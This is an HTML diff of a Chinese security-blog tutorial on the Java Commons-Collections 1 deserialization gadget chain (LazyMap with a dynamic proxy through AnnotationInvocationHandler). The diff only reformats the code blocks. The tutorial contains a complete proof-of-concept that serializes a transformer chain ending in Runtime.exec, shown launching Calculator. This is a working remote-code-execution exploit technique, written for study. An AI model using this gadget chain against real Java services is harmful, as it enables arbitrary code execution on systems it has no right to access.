@@ -478,35 +478,118 @@
             <div id="articleContent">
                 <h1 id="java反序列化CommomCollections1-ysoserial"><a href="#java反序列化CommomCollections1-ysoserial" class="headerlink" title="java反序列化CommomCollections1(ysoserial)"></a>java反序列化CommomCollections1(ysoserial)</h1><p>之前写的CommomCollection中我们用的是TranformedMap,然而在ysoserial中，用到的是LazyMap而非TransformedMap。这片文章我们来探究一下关于LazyMap在反序列化中的应用。</p>
 <h2 id="LazyMap和TransformedMap的区别"><a href="#LazyMap和TransformedMap的区别" class="headerlink" title="LazyMap和TransformedMap的区别"></a>LazyMap和TransformedMap的区别</h2><p>LazyMap和TransformedMap相似，都是来自于Commom-Collections库，并继承AbstractMapDecorator。但是LazyMap在漏洞触发点上和TransformedMap有差别。TransformedMap是在写入新元素时触发执行transform方法。而LazyMap是在其get方法中触发执行transform。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public Object get(Object key) &#123;
+        if (!this.map.containsKey(key)) &#123;
+            Object value &#x3D; this.factory.transform(key);
+            this.map.put(key, value);
+            return value;
+        &#125; else &#123;
+            return this.map.get(key);
+        &#125;
+    &#125;</code></pre>
 
 <p>这里的factory会在实例化时在构造函数中传入。</p>
 <p>但另一个不同于TransformedMap的是，sun.reflect.annotation.AnnotationInvocationHandler的readObject方法中没有直接调用这个get方法。而在AnnotationInvocationHandler的invoke方法中，有调用到这个get方法。所以接下来我们就要想办法执行这个invoke方法。</p>
 <h2 id="java对象代理"><a href="#java对象代理" class="headerlink" title="java对象代理"></a>java对象代理</h2><p>java代理模式是一种设计模式。我们可以通过代理访问目标对象。这样可以增加额外的功能，即扩展目标对象的功能。这样可以使的避免修改源码就能扩展程序的功能，但同时也为我们对象内部的方法调用提供了切入点。java对象代理要用到java.lang.reflect.Proxy</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);</code></pre>
 
 <p>这就是生成一个代理的方法。这里的第一个参数是一个ClassLoader，我们使用默认的就好。第二个参数是需要代理的对象集合。第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑，这个对象需要实现一个invoke方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method,Object[] args)</span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public Object invoke(Object proxy, Method method,Object[] args)&#123;...&#125;</code></pre>
 
 <p>这个invoke方法就是我们扩展功能的地方，当代理调用被代理对象方法时，实际上调用的是这个invoke方法。这里第一个参数proxy是被代理的对象，第二个参数method就是调用的被代理的对象的方法，第三个参数就是调用该方法时传入的参数。</p>
 <p>这里给出一个例子：先创建一个继承了InvocationHandler接口的类并重写invoke方法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method,Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;get&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;method: &quot;</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> args[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">package Proxy;
 
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestInvocationHandler</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line"></span><br><span class="line">        System.out.println(proxyMap.put(<span class="string">&quot;Key&quot;</span>,<span class="string">&quot;Value&quot;</span>));</span><br><span class="line">        System.out.println(proxyMap.get(<span class="string">&quot;key&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.Map;
+
+public class TestInvocationHandler implements InvocationHandler &#123;
+
+    public Object invoke(Object proxy, Method method,Object[] args) throws InvocationTargetException, IllegalAccessException &#123;
+        if (method.getName().equals(&quot;get&quot;))&#123;
+            System.out.println(&quot;method: &quot; + method.getName());
+            return &quot;hacked Object&quot;;
+        &#125;
+        return args[0];
+    &#125;
+&#125;</code></pre>
+
+<pre class="language-java" data-language="java"><code class="language-java">public static void main(String[] args) &#123;
+        InvocationHandler handler &#x3D; new TestInvocationHandler();
+
+        Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);
+
+        System.out.println(proxyMap.put(&quot;Key&quot;,&quot;Value&quot;));
+        System.out.println(proxyMap.get(&quot;key&quot;));
+    &#125;</code></pre>
 
 <p>这里给出运行结果：</p>
 <img src="/Downloads/commony11.png"  style="zoom:50%;" />
 
 <p>我们之前反序列化用的sun.reflect.annotation.AnnotationInvocationHandler，实际上就是一个InvocationHandler。那么如果我们把它传给Proxy.newProxyInstance的第三个参数，那么在readObject中Map调用任意方法时，就会调用到这个invoke方法，我们的目的就实现了。</p>
 <h1 id="LazyMap的POC"><a href="#LazyMap的POC" class="headerlink" title="LazyMap的POC"></a>LazyMap的POC</h1><p>首先，我们要使用LazyMap来替换TransformedMap</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">Map outerMap &#x3D; LazyMap.decorate(innerMap,transformerChain);</code></pre>
 
 <p>其次，要创建一个代理，把包含outerMap的InvocationHandler传给(Proxy.newProxyInstance)的第三个参数</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor constructor &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler &#x3D; (InvocationHandler) constructor.newInstance(Retention.class,outerMap);
+
+Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);</code></pre>
 
 <p>然后我们需要把这个proxyMap传入一个新的InvocationHandler，确保在反序列化这个新的InvocationHandler时，在readObject中会触发proxyMap调用函数。</p>
 <p>最终POC：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                        &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        handler = (InvocationHandler) constructor.newInstance(Retention.class,proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span>  <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Test &#123;
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;
+        Transformer[] fakeTransformers &#x3D; new Transformer[]&#123;new ConstantTransformer(1)&#125;;
+
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,
+                        new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,
+                        new Object[]&#123;null,new Object[0]&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]
+                        &#123;&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),
+        &#125;;
+
+        Transformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);
+
+        Map innerMap &#x3D; new HashMap();
+        Map outerMap &#x3D; LazyMap.decorate(innerMap,transformerChain);
+
+        Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler &#x3D; (InvocationHandler) constructor.newInstance(Retention.class,outerMap);
+
+        Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);
+        handler &#x3D; (InvocationHandler) constructor.newInstance(Retention.class,proxyMap);
+
+        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);
+        oos.writeObject(handler);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o  &#x3D; (Object) ois.readObject();
+    &#125;
+&#125;</code></pre>
 
 <p>最后再整理一次思路：</p>
 <p>LazyMap漏洞触发需要调用get函数。而AnnotationInvocationHandler的invoke方法中，有调用到这个get方法。接下来就是想办法调用这个invoke方法。AnnotationInvocationHandler是一个InvocationHandler。而所有实现了InvocationHandler接口的对象都可被传入到Proxy.newProxyInstance方法的作为第三个参数handler，最后生成一个代理proxyMap。这个代理调用任何方法最后都会调用到handler的invoke方法。然后我们就是要在反序列化的过程中调用到proxyMap的任意方法。这个就和之前的POC一样了。新建一个AnnotationInvocationHandler对象，把proxyMap作为参数传入其构造函数。然后在这个AnnotationInvocationHandler对象反序列化的过程中触发的readObject方法就会触发proxyMap的方法。</p>
